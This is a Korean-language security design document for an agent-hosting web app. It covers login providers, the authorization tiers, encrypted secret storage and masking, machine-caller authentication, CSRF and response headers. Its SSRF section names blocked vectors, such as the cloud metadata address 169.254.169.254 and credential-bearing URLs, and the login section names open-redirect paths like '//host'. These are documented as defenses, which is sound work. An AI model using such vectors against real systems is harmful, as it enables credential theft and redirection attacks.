# 보안

누가 무엇을 할 수 있는지, 자격 증명이 어떻게 저장되고 건네지는지, 이 앱이 강제하는 경계가
어디에 있고. 어디서 끝나는지.

관련 문서: 여기서 언급하는 변수는 [CONFIGURATION.md](CONFIGURATION.md), 엔드포인트별 인가는
[API.md](API.md), 조각들이 어떻게 맞물리는지는 [ARCHITECTURE.md](ARCHITECTURE.md).

## 인증

Better Auth 1.7 이 이 앱의 커넥션 풀 위에서 라이브러리 자신의 Postgres 어댑터로 돈다.
`user`, `session`, `account`, `verification` 은 그것이 소유하는 테이블이고(`migrations.ts` 가
만든다), email·token 의 유일성은 테이블의 유니크 제약이다. 로그인 수단은 **전부 선택**이고
설치가 고른다 (`src/lib/config.ts` 의 `authProviders`, 그대로 `auth.ts` 와 로그인 페이지로):

| 수단 | 켜는 것 | 성질 |
|---|---|---|
| 표준 OIDC | `OIDC_ISSUER` + `OIDC_CLIENT_ID` + `OIDC_CLIENT_SECRET` | `genericOAuth` 로 discovery 문서에서 찾고 PKCE 를 쓴다. 배포당 하나. 기업의 디렉터리는 하나이고, 두 번째 제공자는 사람이 누구인지에 대한 두 번째 정본이다. 콜백 `/api/auth/callback/oidc` |
| Google | `GOOGLE_CLIENT_ID` + `GOOGLE_CLIENT_SECRET` | 콜백 `/api/auth/callback/google` |
| 이메일 + 비밀번호 | `AUTH_PASSWORD=true` | **가입 폼이 없다**(`disableSignUp`): 신원 제공자가 보증하는 사람은 첫 로그인으로 사용자가 되지만, 비밀번호 계정은 아무도 보증하지 않으므로 부트스트랩 관리자(`BOOTSTRAP_ADMIN_EMAIL`/`PASSWORD`, 부팅 때 한 번)와 관리자가 의도적으로 만든 계정뿐이다. 첫 관리자와 제공자가 죽었을 때의 비상 접근용이다 |

`STAGE=alpha|prod` 는 셋 중 하나도 없으면 부팅을 거부한다(`assertAccessControlConfig`);
`local` 은 `scripts/dev-session.ts` 가 세션을 만들어 주므로 없어도 된다. 로그인은 수단과
무관하게 `ALLOWED_EMAIL_DOMAINS` 로 제한된다. 사용자 생성과 세션 생성 양쪽의 훅에서, 그래서
이미 있는 사용자도 도메인이 목록에서 빠지면 다음 로그인에 거절된다. 빈 목록은 모든 도메인을
허용한다. `STAGE=alpha|prod` 도 그 상태로 정상 부팅한다
([부팅 시 검증](CONFIGURATION.md#부팅-시-검증) 참고).

admin 전용 멤버 목록은 Better Auth 의 user 행을 읽는다. `createdAt` 은 가입 시각이고,
`lastLoginAt` 은 세션 생성에 성공한 뒤 갱신된다. 그 이전부터 있던 사용자는 다시 로그인하기
전까지 마지막 로그인 값이 없다. 타임스탬프 갱신 실패는 로그에 남지만, 신원 제공자 로그인에
성공한 것을 인증 실패로 바꾸지는 않는다.

### 두 개의 게이트, 의도적으로

| 표면 | 게이트 | 무엇을 결정하는가 |
|---|---|---|
| 페이지 | `src/proxy.ts` | 로그아웃 상태의 방문자를 `/login?next=…` 로 리다이렉트 |
| API 라우트 | `withAuth` / `withMemberAuth` / `withAdminAuth` (`src/lib/session.ts`) | 세션이 없으면 401, 요구 tier(`member`, `admin`) 미만이면 403; 핸들러에 `SessionUser` 를 건넨다 |

`src/shared/pageAccess.ts` 는 어떤 페이지가 공개인지에 대한 단일 소유자다. `/` 와 `/login`.
`src/proxy.ts`와 브라우저의 만료 세션 redirect가 같은 판정을 읽는다. matcher 가 닿는 나머지
전부는 세션을 요구하므로 **새 라우트는 기본이 보호 상태** 다. 그 방향은
의도적이다. 공개 페이지를 목록에 넣는 것을 잊으면 사용자가 1분 안에 신고하는 리다이렉트가
생기지만, 비공개 페이지를 넣는 것을 잊으면 조용히 실패한다.

페이지 게이트는 세션 쿠키의 유효성이 아니라 *존재* 를 확인한다. 유효성까지 확인하려면 모든
내비게이션마다 세션을 읽어야 하고, 그러고도 그것은 인가 결정이 아니다. 인가는 실제로
데이터를 만지는 요청을 보는 `withAuth` 와 `assertProjectWritable` 에서 서버 측에 남는다.
따라서 존재하지만 유효하지 않은 쿠키는 페이지에 도달하고 그 뒤의 API 에서 401 을 받는다.
브라우저의 공통 응답 경계는 같은 origin의 `/api/*` 401을 받으면 현재 path·query·fragment를
`next`로 보존해 `/login`으로 full navigation한다. Root layout이 이미 세션을 유효하지 않다고
판정한 보호 페이지도 같은 경로를 탄다. 게이트가 없애는 것은 평범한 로그아웃 상태이며,
그 방문자에게 콘솔 shell이나 API error box를 렌더링하지 않는다.

`/api` 는 matcher 밖에 있다. 그 라우트들은 스스로 인증하며, 프로그램 호출자에게는 HTML
리다이렉트가 아니라 반드시 401 로 답해야 한다.

`next` 파라미터는 주소창에서 오므로 `/login` 은 그것을
`safeNextPath`(`src/shared/safeNextPath.ts`)로 되읽는다. `//host` 와 `/\host` 를 거부하지
않으면 로그인 플로우가 오픈 리다이렉트가 된다.

거부는 같은 주소창을 통해 되돌아 나간다. Better Auth 는 브라우저의 `error` 파라미터를 던져진
에러의 *메시지* 로 만들기 때문에, 그 메시지는 산문이 아니라 와이어 포맷이다. 거기에 쓴 문장은
URL 에 실리고, 그것이 배포의 허용 도메인 목록이 방금 거절당한 사람에게 전달되던 경로였다.
코드는 대신 `src/shared/signInError.ts` 에 있고(`EMAIL_DOMAIN_NOT_ALLOWED` 가 이 앱이 올리는
유일한 코드다), `/login` 이 그 코드를 자신이 소유한 문구로 매핑한다. 인식하지 못한 값은
**그대로 되비추는 대신** 하나의 일반 문구로 수렴한다. 그 파라미터는 서버가 쓴 텍스트이고, 그
매핑이 생기기 전에 리다이렉트된 배포는 지금도 자기 도메인을 밝힌 문장 하나를 통째로 보낼 수
있다. Better Auth 가 스스로 올리는 코드. 취소된 동의 화면, 만료된 콜백. 는 서버 로그만이
조치할 수 있는 방식으로 다르므로, 그것들도 함께 수렴한다.

## 인가 모델

**Project 는 공유 카탈로그이되, 공개 범위(visibility)를 갖는다.** `public`(기본값이자
`visibility` 필드가 없는 기존 행의 의미)은 로그인한 사용자라면 누구나 읽고 실행하고 복제할
수 있다. `private` 은 그 범위를 소유자와 `memberEmails` 의 초대 목록으로 좁힌다. 쓰기는
이 축과 무관하게 언제나 소유자-또는-admin 이다. 판정의 유일한 정의는
`src/domain/project/access.ts` (`mayAccessProject`)이고, admin 오버라이드를 합친 형태가
`assertProjectAccessible` / `userMayAccessProject` (`projectUseCases.ts`)다. 새 읽기·실행
표면은 이 둘 중 하나를 지나며, `visibility` 나 `memberEmails` 를 직접 비교하는 두 번째
판정을 만들지 않는다.

**세 부류의 표면이 세 가지로 다르게 게이트된다.** 사람이 세션으로 들어오는 콘솔·chat 은
`assertProjectAccessible` 로 막는다. API token, trigger, webhook, A2A 클라이언트 키, 그리고
소유자가 직접 연결한 Telegram·Teams bot 은 *자격 증명 자체가 접근권* 이라 visibility 를 묻지
않는다. token 은 소유자로서 행동하고, bot 배선은 소유자의 선택이다. Slack bot 만 그 중간에
있다: workspace 의 누구나 말을 걸 수 있으므로, private project 의 bot 은 `users.info` 의
이메일로 묻는 사람을 식별해 초대 여부를 확인하고, 이메일을 공유하지 않는 workspace 의
사용자는 거절한다 (`slackSenderMayAccess`, 런, `!mute` 명령, thread-start 인사가 같은
게이트를 지난다). 앱이 서명한 메시지(키워드로 깨운 알림 등)는 통과한다: 그 키워드는
소유자 자신의 설정이라 trigger 와 같은 소유자-배선 자동화다. 조회된 주소는 판정에만
쓰이고 프롬프트에는 닿지 않는다. 초대 목록 자체(`memberEmails`)는 제3자 주소의 명부이므로
응답에서도 소유자·admin 에게만 나간다 (`sanitizeProject`). 무인증 A2A Agent Card
(`/.well-known/agent-card.json`)는 자격 증명이 전혀 없는 경로이므로 private project 를
404 로 감춘다.

private project 를 local subagent 로 *바인딩* 하는 것도 읽기다: 편집자가 접근할 수 없는
project 는 버전 저장 시점에 거절된다 (`assertSubagentProjectsAccessible`). 이미 바인딩된
참조는 project 가 뒤늦게 private 이 되어도 편집 가능성을 잃지 않는다. 실행 시점의 transfer
는 소유자의 token 과 같은 플랫폼 자신의 조립이다. 비용 대시보드의 project *합계* 는
visibility 이전처럼 열려 있다: 이름과 지출 집계는 카탈로그 운영의 일부로 남겨 둔 결정이다.

| 리소스 | 읽기 | 쓰기 |
|---|---|---|
| Project, version | 접근 가능한 사용자 (`assertProjectAccessible`, public 은 전원, private 은 소유자·초대 멤버·admin) | 소유자 또는 설정된 admin (`assertProjectWritable`) |
| Project trace | 소유자 또는 설정된 admin | — |
| Project Slack 설정 | 소유자 또는 설정된 admin | 소유자 또는 설정된 admin |
| Project API token, trigger, MCP 연결 | 소유자 또는 설정된 admin | 소유자 또는 설정된 admin |
| 호출자별 usage (`usage/actors`) | 소유자 또는 설정된 admin | — |
| Project usage 합계 | 로그인한 모든 사용자 | — |
| Skill / MCP 서버 / 외부 agent / plugin | `member` tier 이상 (`withMemberAuth`; `guest` 는 403) | admin (`withAdminAuth`) |
| 앱 설정 | admin | admin |
| 모델 즐겨찾기 | 로그인한 사용자 본인 | 로그인한 사용자 본인 |
| 멤버 디렉터리 | admin | admin (tier 변경, `member.set-tier` 로 감사) |
| Chat | 소유자만 (소유자가 아니면 404) | 소유자만 |

trace 와 Slack 설정은 *읽기* 도 게이트되는데, 다른 사용자의 런타임 입출력과 마스킹된 자격
증명의 가장자리를 노출하기 때문이다. project *합계* 는 카탈로그가 공유되므로 열어 둔다.
호출자별 내역은 개인을 지목하므로 `usage/actors` 는 그렇지 않다. capability 레지스트리는
`guest` tier 에서 제외되는데, 그것이 담는 것은 guest 자신의 작업에 필요한 무엇이 아니라 이
배포가 무엇에 닿을 수 있는지의 목록이기 때문이다. guest 도 그것들에 바인딩된 project 를
*실행* 은 하며, 해석(resolution)은 서버 측에서 일어난다. project 의 `preview` 도 같은 단에
있다. 레지스트리가 감췄을 해석된 capability 이름을 그대로 렌더링하기 때문이다.

### `isAdminEmail` vs `isConfiguredAdmin`

둘 다 `src/lib/runtime-settings.ts` 안에 있는 서로 다른 admin 질문이고, 뒤바꿔 쓰면 안 된다:

| 술어 | 질문 | `ADMIN_EMAILS` 가 비었다는 것의 뜻 |
|---|---|---|
| `isAdminEmail` | 공유 레지스트리와 앱 설정을 변경해도 되는가? | **제한 없음**. 로그인한 모든 사용자 |
| `isConfiguredAdmin` | 남이 소유한 project 를 써도 되는가? | **아무도 안 된다** |

첫 번째를 project 소유권에 쓰면 `ADMIN_EMAILS` 를 한 번도 설정하지 않은 배포에서 로그인한 모든
사용자에게 모든 project 의 쓰기 권한을 넘기게 된다. 두 플래그는 `GET /api/me` 가 브라우저로
함께 보낸다. `isAdmin` 과 `isConfiguredAdmin` 으로. "이 project 를 편집해도 되는가"에 대한
콘솔의 게이트가 `assertProjectWritable` 을 정확히 반영해야 하기 때문이다. 거기서 `isAdmin` 을
읽었더니 모든 사용자에게 모든 project 의 편집 폼이 열렸고, 저장은 전부 403 이 났다.

**멤버 tier 는 두 번째 소스를 더할 뿐, 두 번째 술어를 만들지 않는다.** 저장된 `tier` 가
`admin` 인 멤버는 *두* 술어가 부여하는 것을 모두 얻는다. 그 합성은 오직
`src/lib/memberAccess.ts` 의 것이고(`isEffectiveAdmin` / `isEffectiveConfiguredAdmin`), 위 두
목록 술어는 빈 목록에 대한 의미를 바이트 단위로 그대로 유지한다. `ADMIN_EMAILS` 에 설정된
주소는 로그인 시 또는 다음 멤버/프로필 읽기 때 저장된 `admin` tier 로 승격되고, 그 주소가
설정에 남아 있는 동안 tier 는 잠긴다. 목록에서 빼도 결코 강등되지 않는다. 다른 운영자가
명시적으로 더 낮은 tier 를 골라야 한다. tier 는 Better Auth 의 user 행에 있고(`input: false`
라 어떤 auth API 로도 사용자가 자기 것을 설정할 수 없다), 내부 어댑터 또는
`memberRepository.setTier` 의 단일 속성 조건부 업데이트로만 쓰이며, 세션에 실려 라우트
핸들러에 도달한다. 요청마다 새로 읽는다. 세션을 볼 일이 없는 이음매들(project 쓰기
오버라이드, 런 브래킷의 가드)은 email → tier 를 30초짜리 인스턴스별 캐시로 해석하고, 그 캐시는
tier 변경을 처리한 인스턴스에서 무효화된다. 각 tier 가 동시에 몇 개를 진행할 수 있는지, UTC
월 기준으로 얼마를 쓸 수 있는지, 무엇을 할 수 있는지(project 생성, API token 사용)는
`src/domain/member/tiers.ts` 의 `TIER_LIMITS` 다. 게이트는 tier 이름 비교가 아니라 그 파일의
`tierMay*` 술어를 거친다. project 생성도 별도의 effective-admin 우회 없이 그 tier capability 를
따른다.

월 상한은 멤버 자신의 일별 행을 UTC 월 1일부터 합산한다. 프로필 페이지가 읽는 것과 같은 창,
같은 행이다. 집계가 하나뿐이므로 페이지가 가드와 어긋나는 합계를 보고할 수 없다. 사람 모양의
한도는 `user` actor 에만 적용된다. 기계 호출자(Slack, A2A, webhook, schedule)에는 멤버가 없다.
**project token** 은 소유자의 email 을 싣지만 의도적으로 소유자의 개인 예산이 아니라 *자기
project* 의 한도에서 지출한다. token 은 서비스 자격 증명이다. 그것이 우회가 되지 않게 하는
것은 token 게이트다. API token 권한이 없는 tier 는 token 을 발급할 수도 없고(소유자 범위,
admin 포함) 이미 있는 token 으로 인증할 수도 없다. `authenticateExecution` 은 모든 bearer
요청에서 소유자의 현재 tier 를 다시 확인하고 403 으로 답하므로, 강등은 그 소유자의 token 을
즉시 멈춘다. 멤버 행이 없으면 기본 `guest` 로 거절하고, tier 저장소를 읽지 못하면 503 으로
fail-closed 한다. 권한 저장소 장애가 이미 제한된 credential 을 다시 활성화해서는 안 된다.

admin 오버라이드는 스무 곳 남짓한 호출자가 인자로 꿰어 넘기는 대신 `assertProjectWritable`
*안에서* 확인된다. 규칙은 "소유자 또는 admin"이고, 한 호출자가 넘기는 것을 잊은 플래그는 그
경로에서만 조용히 소유자 전용으로 규칙을 좁힐 것이다. 함수 이름은 소유자가 아니라 그 규칙을
따라 붙었다. 진짜로 **소유권** 이 필요한 것(attribution, 누구의 자격 증명으로 디스패치할지,
누구에게 알릴지)은 `project.ownerEmail` 을 읽는다.

오버라이드의 두 가지 귀결은 없는 셈 치지 않고 처리한다:

- **기록된다**. `project.admin-override` 감사 행과
  `[authz] admin … is acting on project …` 라인. 그 쓰기가 누가 했는지를 알려 줬을 행 자체를
  파괴할 수 있고, project 의 API token 은 *그 소유자로서* 인증하므로 admin 의 reveal 은 그 둘에
  더해 `secret.reveal` 행을 남긴다.
- 그것이 필요로 하는 설정 읽기는 **fail-closed** 다. 설정 저장소 장애는 소유자가 아닌 사람의
  결정적인 403 을 500 으로 바꾸는 대신 오버라이드를 거부한다.

## 저장된 시크릿

저장되는 모든 자격 증명. MCP 서버 헤더, 외부 agent 헤더, 버전별 헤더 오버라이드, MCP OAuth 의
access/refresh token·client secret·인가 중인 PKCE verifier, Slack 봇 token 과 서명 시크릿,
Telegram 봇 token 과 webhook 시크릿, Teams(Azure Bot) 클라이언트 시크릿, 앱 전역 A2A 키와
이름 있는 A2A 클라이언트 키, project API token, webhook trigger 시크릿, 그리고 시크릿인 앱
설정(LLM API 키와 plugins 저장소의 GitHub token)은 `AES_ENCRYPTION_KEY` 로 AES-256-GCM
암호화된다(`src/infrastructure/crypto/secretEncryption.ts`). 새 값은 모두 `enc:v2:` 로 쓴다.
v2 는 row 와 field 정체성을 AES-GCM AAD 로 묶으므로 암호문만 다른 위치로 옮기면 인증에
실패한다. 기존 `enc:v1:` 값은 다시 저장하거나 재발급하기 전까지 그대로 읽는다.

Project API token, 이름 있는 A2A client key, webhook trigger secret 은 각각 project 이름,
client 이름, `project + triggerId` 에 묶인다. Slack 의 bot token·signing secret, Telegram 의 bot
token·webhook secret, Teams 의 app password 는 `project + integration + field` 를 쓴다.
MCP·external agent 의 registry header 는 항목 이름과 header 이름에, managed MCP 의 environment 는
항목 이름과 변수 이름에 묶인다. HTTP header의 override 병합만 이름의 대소문자를 무시하고,
AAD 는 environment와 같은 공통 map 규칙에 따라 저장된 키 철자를 그대로 쓴다.

Version 의 MCP header override 는 `project + version + server + header` 에 묶인다. 저장된 version 을
임시 preview draft 로 읽을 때는 값을 복호화해 `draft` 컨텍스트로 다시 암호화하고, project clone 은
소유자의 override 를 애초에 복사하지 않는다.
MCP OAuth connection 의 client secret·access token·refresh token 은 `project + server + field` 에,
인가 중인 PKCE verifier 는 일회성 state 값에 묶인다. Token refresh의 compare-and-set은 저장소가
연결을 쓸 때마다 발급하는 revision을 비교한다. 토큰 값과 타임스탬프가 같아도 새 연결을 구분하며,
갱신 경쟁에서 진 요청은 최초 issuer·resource와 일치하는 connected grant만 사용할 수 있다.
앱 설정의 기본 LLM key 는 effective base URL 에, provider별 key 는 `provider name + base URL` 에
묶인다. 따라서 DB에서 key만 다른 endpoint로 옮기거나 저장 뒤 환경의 base URL만 바꾸면
복호화되지 않으며 새 key를 입력해야 한다. GitHub token과 shared A2A key는 각각 고정된 settings
field 컨텍스트를 쓴다.
부팅, 저장 시크릿 암호화, proxied URL 서명은 모두 `decodeAes256Key` 를 거쳐 canonical base64 로
인코딩된 정확히 32바이트 key 만 사용한다.

### 읽을 때의 마스킹

읽기는 **길이를 보존하는 마스크** 를 반환한다. 콘솔이 값을 보여 주지 않으면서 *어떤* 자격
증명이 설정돼 있는지는 보여 줄 수 있게 하기 위해서다:

| 평문 길이 | 드러나는 부분 |
|---|---|
| 9자 미만 | 없음 (`*` × 길이) |
| 9–20자 | 앞 2자와 뒤 2자 |
| 21자 이상 | 앞 4자와 뒤 4자 |

드러난 두 가장자리가 만나는 일은 결코 허용되지 않는다. 가장자리를 드러내려면 평문이
필요하므로 마스킹은 복호화를 한다. 그것을 호출하는 admin/소유자 게이트가 걸린 읽기 뷰
안에서만이고, 복호화 실패는 에러를 내는 대신 값을 통째로 감춘다. 아무것도 드러나지 않을 만큼
짧은 값은 아예 복호화되지 않으며, 그 판단은 암호문 길이로 내린다(AES-GCM 은 평문 길이를
보존한다).

### 쓸 때의 마스크

업데이트 시 마스킹된 값이나 빈 값은 **저장된 시크릿을 보존한다**. 저장된 상대가 없는 키에 온
마스킹된 값은 **버린다**. 마스크는 이미 있는 시크릿을 확인해 줄 수만 있고, 만들어 낼 수는
없다. 헤더 오버라이드 맵의 `null` 은 명시적 제거로 그대로 통과한다. 제거는 시크릿이 아니다.
새로 입력한 값은 `enc:v1:` 또는 `enc:v2:` 로 시작하더라도 평문으로 취급해 항상 새로 암호화한다. 암호문 접두사는
저장소에서 읽은 값의 형식일 뿐, API 입력이 신뢰할 수 있는 저장 값이라는 증거가 아니다.
버전별 MCP 문자열 오버라이드는 저장 당시 registry URL 의 fingerprint 와 함께 보관한다. 같은
이름의 URL 이 바뀌거나 fingerprint 가 없는 예전 값이면 옛 시크릿을 보내지 않는다. 새 endpoint
용 자격 증명을 다시 입력해야 한다.

### reveal 엔드포인트

이 앱이 발급하는 시크릿 중 넷은 평문으로 되읽을 수 있다:

| 시크릿 | 엔드포인트 | 누가 |
|---|---|---|
| 앱 전역 A2A 키 | `POST /api/settings/a2a-key/reveal` | admin |
| 이름 있는 A2A 클라이언트 키 | `POST /api/settings/a2a-keys/{name}/reveal` | admin |
| Project API token | `POST /api/projects/{name}/token/reveal` | 소유자 또는 admin |
| Webhook trigger 시크릿 | `POST /api/projects/{name}/triggers/{trigger}/reveal` | 소유자 또는 admin |

넷 모두 **읽는데도 POST** 다. 응답 본문이 살아 있는 자격 증명이므로 캐시, 브라우저 기록,
프리페치 바깥에 머물러야 한다. 모든 reveal 은 호출자의 email 과 함께 **감사 행** 을 남기고, 그
옆에 서버 측 로그 라인도 남긴다. 행은 나중의 질문이 조회하는 것이고, 라인은 감사 저장소 자체가
불가용할 때 살아남는 것이다.

따라서 이 넷은 해시가 아니라 **암호화해서** 저장되며, 이는 의도된 트레이드오프다. 데이터스토어만으로는
하나도 쓸 수 없지만, 데이터스토어 *더하기* `AES_ENCRYPTION_KEY` 면 쓸 수 있다. **그 키를 테이블
덤프와 살아 있는 project 자격 증명 사이에 서 있는 것으로 다뤄라.** reveal 이 생기기 전에 발급된
project token 은 대신 SHA-256 해시로 저장돼 있다. 검증은 되지만 다시 보여 줄 수는 없으므로
콘솔이 재발급을 제안한다.

### 발급한 시크릿의 접두사

Agent Studio 가 발급하는 시크릿은 GitHub 의 `ghp_`/`gho_` 처럼 제품과 종류를 밝히는 접두사를
지녀(`src/shared/generatedSecret.ts`), 유출된 문자열이 무엇을 여는지 추적할 수 있다:

| 접두사 | 시크릿 |
|---|---|
| `asa_` | 앱 전역 A2A 키 (admin 관리) |
| `asc_` | 이름 있는 A2A 클라이언트 키 (admin 관리) |
| `ast_` | Project API token (소유자 관리) |
| `asw_` | Webhook trigger 시크릿 (소유자 관리) |
| `asg_` | Telegram webhook 시크릿 (project 마다 발행. Telegram 에게만 건네고 결코 reveal 하지 않는다) |

랜덤 부분은 32바이트(256비트)이므로 접두사가 잡아먹는 엔트로피는 문제가 되지 않는다. 검증은
접두사를 결코 보지 않으므로 예전 표기로 발급된 token. `ad*_`, 그 이전의 `sk_proj_`. 도 계속
동작한다.

project token 의 표시용 마스크는 생성 시점에 계산돼 암호문 옆에 저장되므로, token 을 나열하는
데는 복호화 비용이 들지 않는다. 그 마스크는 접두사와 가장자리 문자만 실어 나르며, token 을
복원하기에 충분한 적은 결코 없다.

## 머신 호출자의 요청 인증

세션 쿠키가 없는 호출자를 인증하는 자격 증명이 일곱 가지 있다:

| 표면 | 자격 증명 | 검증 |
|---|---|---|
| 실행 엔드포인트 (`predict`, `chat/completions`, `agent`) 와 AG-UI (`/api/agui/{project}`) | `Authorization: Bearer ast_…` | 복호화 후 상수 시간 비교(레거시 token 은 해시 비교), 경로의 `{name}` 으로 범위 제한. **project 소유자로서** 실행된다 (`authenticateExecution`) |
| Slack 이벤트 | Slack 서명 시크릿 | HMAC + `timingSafeEqualString`, 5분 리플레이 윈도, project 별 시크릿 |
| Telegram webhook | `X-Telegram-Bot-Api-Secret-Token` | 이 플랫폼이 webhook 을 등록할 때 쓴 project 별 시크릿(`asg_…`)과 `timingSafeEqualString` 비교. Telegram 이 배달마다 그대로 되돌려주며, 그 밖에 확인할 서명은 없다 |
| Teams messaging endpoint | Bot Framework bearer 토큰 (JWT) | RS256 서명을 서비스가 공개한 JWKS(`login.botframework.com`) 로 검증하고, 발급자 `https://api.botframework.com`, audience = 그 봇의 App ID, `exp`/`nbf`(5분 skew), 그리고 **`serviceurl` 클레임 = activity 의 `serviceUrl`** 을 요구한다. 답은 그 주소로 이 앱의 토큰을 붙여 나가므로. Emulator 토큰은 받지 않는다 (`src/infrastructure/teams/client.ts`) |
| 인바운드 A2A | `X-A2A-Key` | 공유 `A2A_API_KEY` 와 상수 시간 비교(actor `a2a:shared-key`), 아니면 admin 이 발급한 **이름 있는 클라이언트 키** 에 대한 해시 조회 후 primary row 의 컨텍스트 결합 token 을 상수 시간으로 재확인(actor `a2a:{client}`, 클라이언트별로 attribution 되고 rate limit 된다). 둘 다 설정돼 있지 않으면 엔드포인트는 꺼져 있다 |
| Webhook trigger | `X-Trigger-Secret` | `cipher.decryptEquals` (상수 시간) |
| CronJob 틱. schedule 스캔(`/api/triggers/scan`), 카탈로그 재색인(`/api/catalog/reindex`), plugins sync(`/api/plugins/sync/scan`) | `X-Scan-Token` | `SCHEDULE_SCAN_TOKEN` 과 `timingSafeEqualString` 비교. 설정돼 있지 않으면 503 으로 답하고, 거부된 token 은 셋 모두에서 경고를 로그에 남긴다 |

**하나의 token 이 세 틱을 모두 연다.** 그래서 일곱 중 가장 넓다. CronJob 이 어떤 schedule 이
도래했는지 물을 수 있게 해 주는 그 문자열이 plugins sync 도 실행하고, 그 sync 는 두 레지스트리
skill 과 MCP 서버. 를 모두 쓴다. 저장소가 선언한 이름을 채택하고 provenance 를 그것으로 다시
쓴다. 그것은 프로브가 아니라 쓰기 자격 증명으로 범위를 잡고 회전시켜라.

A2A 의 401 은 `WWW-Authenticate: ApiKey realm="a2a", header="X-A2A-Key"` 를 싣고 카드가 같은
스킴을 선언하므로, 표준 클라이언트는 무엇을 제시할지 카드에서 읽는다.

형제 중 하나는 자격 증명을 아예 지니지 않는다. public project 의 A2A **Agent Card**
(`/.well-known/agent-card.json`)는 표면이 켜져 있기만 하면. 공유 `A2A_API_KEY` 또는 최소 하나의
이름 있는 클라이언트 키. 누구에게나 제공된다. 그것이 agent 를 발견 가능하게 만드는 것이고, A2A
핸드셰이크는 카드에서 시작하기 때문이다. 카드는 project 의 이름, 설명, skill 을 노출하므로
private project 는 publish 돼 있어도 같은 `404`로 숨긴다. JSON-RPC endpoint 는 키 자체가
project 의 자격 증명이므로 private project 도 호출할 수 있다.

trigger 시크릿은 활성화 플래그를 읽기 **전에** 비교된다. 비활성 trigger 가 틀린 시크릿에 활성
trigger 와 다르게 답할 수 없게 하기 위해서다. 그 차이는 어떤 trigger 가 존재하는지에 대한
오라클이다.

상수 시간 비교는 소유자가 하나, `src/shared/timingSafe.ts` 이고
`tests/architecture.test.ts` 가 고정한다.

리플레이 방지: Slack 이벤트는 `event_id` 로, Telegram 업데이트는 project·봇별 `update_id` 로,
Teams activity 는 project·App ID 별 activity id 로 정확히 한 번만 처리되도록 중복 제거된다(조건부 put, 24시간 TTL, 공유된 하나의
claim-and-settle 저장소). 그 claim 은 나중에 정산되는 **리스** 이므로, 처리 도중 죽은
인스턴스는 아무도 처리하지 않았는데 처리된 것으로 기록된 이벤트가 아니라 다시 가져갈 수 있는
claim 을 남긴다. Webhook 배달도 같은 방식으로 `Idempotency-Key` 를 선점한다.

## 인바운드 요청 크기

JSON 본문은 schema 검증 전에 bounded reader를 지난다. 관리·편집 요청은 Skill 전체 파일 한도에서
파생한 editor 한도, 이미지·문서를 실을 수 있는 실행 요청은 attachment 한도에서 파생한 turn
한도, model catalog 업로드는 catalog 한도를 쓴다. webhook 네 종류는 서명 검증에 필요한 raw
본문을 공통 1MB 한도 아래에서 읽는다. 선언된 `Content-Length`가 한도를 넘으면 body를 읽지 않고
413을 답하고, chunked body는 누적 바이트가 한도를 넘는 즉시 stream을 취소한다.
256KiB prose allowance를 넘는 큰 실행 본문은 프로세스 단위의 **바이트 예산**에 과금된다.
예산은 최대 turn 본문 두 개 분량이고, 요청은 자기가 실제로 읽은 바이트만큼만 쓴다. 과금은
파싱부터 run 또는 stream이 입력을 놓을 때까지 유지되고, 연결에서 분리되어 계속 도는 chat은
내부 drain 완료까지 유지한다. 일반 text turn은 아무것도 쓰지 않는다. 예산이 모자라면 body를
취소한 뒤 `Retry-After`를 포함한 429를 답한다. A2A raw JSON 경로도 같은 게이트를 지난다.

**개수가 아니라 바이트인 이유**: 큰 본문의 크기는 두 자릿수 배 차이가 난다. 요청 수로 세면
스크린샷 한 장(수백 KB)을 실은 대화가 84MB 짜리 문서 네 개짜리 턴과 같은 permit 을 쓰고,
permit 은 런이 끝날 때까지 유지되므로 그런 대화 둘이 도는 동안 나머지 전원이 최대
`MAX_RUN_DURATION_MS` 동안 429 를 받는다. 막아야 하는 것은 heap 이므로 heap 을 센다.

`tests/architecture.test.ts`는 API route의 직접 `request.json()`과 `request.formData()` 호출을
거부한다. Zod의 필드 크기 검사는 파싱 뒤의 값 규칙이지, 파싱 전에 발생하는 메모리 할당 제한이
아니다.

## Session mutation과 CSRF

Cookie session으로 인증하는 `POST`·`PUT`·`PATCH`·`DELETE`는 `Origin`이 request origin 또는
설정된 `PUBLIC_BASE_URL` origin과 정확히 같아야 한다. Origin이 없거나 `null`이거나 URL로
해석되지 않으면 403이다. 세 session wrapper가 일반 console API를 한 번에 보호하고, project
실행 API는 bearer project token을 먼저 검증한 뒤 cookie session으로 fallback할 때 같은 검사를
적용한다. bearer token, webhook signature, A2A key처럼 cookie를 쓰지 않는 머신 호출에는 CSRF
검사를 적용하지 않는다.

리버스 프록시 밖의 origin과 앱이 보는 request origin이 다르면 `PUBLIC_BASE_URL`을 반드시
설정하라. 이 값은 외부 callback URL뿐 아니라 어떤 browser origin이 session cookie를 쓸 수
있는지 결정한다.

## 응답 헤더

`next.config.ts` 에서 콘솔과 일반 API 경로에 기본으로 설정한다. 저장된 바이트를 응답하는
`/api/artifacts/{id}/view` 와 `/api/objects/*` 는 제외되고 각자 sandbox CSP 를 설정한다.
`frame-ancestors 'none'` 과
`X-Frame-Options: DENY` 는 콘솔에 artifact 를 지우고 키를 회전시키는 버튼이 있고, 프레임에 넣은
페이지가 바로 그 클릭을 수집하는 방법이기 때문이다. `X-Content-Type-Options: nosniff` 는 한
라우트가 `text/html` 로 답하면서 인가 서버의 말을 거기에 싣기 때문이다. `Referrer-Policy:
strict-origin-when-cross-origin` 은 여기서는 URL 자체가 자격 증명인 경우가 많고. 서명된
오브젝트 주소, webhook 경로. 전체 리퍼러는 그것을 독자가 다음에 클릭하는 곳에 건네주기
때문이다.

일반 script/style 로드를 제한하는 CSP 는 아직 없다. 현재 정책은 framing 만 막는다. Mantine 과
Next 둘 다 인라인 스타일을 내보내므로 쓸모 있는 정책에는 nonce 파이프라인이 필요하다. 잘못된
정책은 콘솔을 조용히 망가뜨리는데, 그것은 없는 것보다 나쁘다. 그때까지 일반 경로의 CSP 는
주입된 스크립트에 대한 두 번째 방어선이 아니다. 각 싱크에서의 이스케이핑이 유일한 방어선이다.

## 아웃바운드 요청 (SSRF)

운영자가 등록한 URL. MCP 서버와 외부 agent. 은 `src/infrastructure/net/ssrfGuard.ts` 가
**등록 시점과 디스패치 시점 모두** 에서 검증한다. 거부되는 것: `http(s)` 가 아닌 스킴,
userinfo 를 실은 URL(`https://user:pass@host`, 주소 안의 자격 증명은 여기서 무언가를 인증하는
방식이 아니고, 호스트를 다른 것처럼 읽히게 만드는 상투적 수단이다), 그리고
사설·루프백·링크로컬(클라우드 메타데이터 주소 `169.254.169.254` 포함) 또는 그 밖의 예약 대역으로
해석되는 호스트.

